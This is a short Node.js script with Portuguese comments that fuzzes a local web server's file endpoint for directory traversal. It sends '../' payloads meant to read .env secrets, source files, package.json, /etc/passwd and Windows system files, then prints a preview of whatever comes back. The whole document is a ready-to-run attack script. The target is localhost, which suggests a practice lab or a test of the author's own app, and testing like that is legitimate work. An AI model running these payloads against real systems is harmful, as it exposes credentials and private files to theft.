const http = require('http');
const url = require('url');
//http://localhost:8082/file?name=../main.js
const target = 'http://localhost:8082/file?name=';

// Lista de arquivos e caminhos que vamos tentar acessar
const payloads = [
  '../main.js',
  '../server.js',
  '../package.json',
  '../.env',
  '../../.env',
  '../../../.env',
  '../../../etc/passwd',
  '../../../etc/hosts',
  '../../../windows/system.ini',
  '../../../../../../../../etc/passwd',
  '../public/default.txt', // arquivo legítimo
];

function sendRequest(payload) {
  return new Promise((resolve, reject) => {
    const fullUrl = target + encodeURIComponent(payload);

    http.get(fullUrl, (res) => {
      let data = '';
      res.on('data', chunk => (data += chunk));
      res.on('end', () => {
        resolve({ payload, status: res.statusCode, body: data });
      });
    }).on('error', reject);
  });
}

async function fuzzTraversal() {
  console.log('🔍 Iniciando fuzzing de Directory Traversal...\n');

  for (const payload of payloads) {
    try {
      const result = await sendRequest(payload);
      const preview = result.body.slice(0, 100).replace(/\n/g, ' '); // mostrar início do conteúdo

      console.log(`📂 Payload: ${payload}`);
      console.log(`🔁 Status: ${result.status}`);
      if (result.status === 200) {
        console.log(`✅ Arquivo encontrado! Prévia:\n${preview}...\n`);
      } else {
        console.log(`❌ Não encontrado\n`);
      }

      console.log('-----------------------------------\n');
    } catch (err) {
      console.error(`Erro ao testar "${payload}":`, err.message);
    }
  }
}

fuzzTraversal();
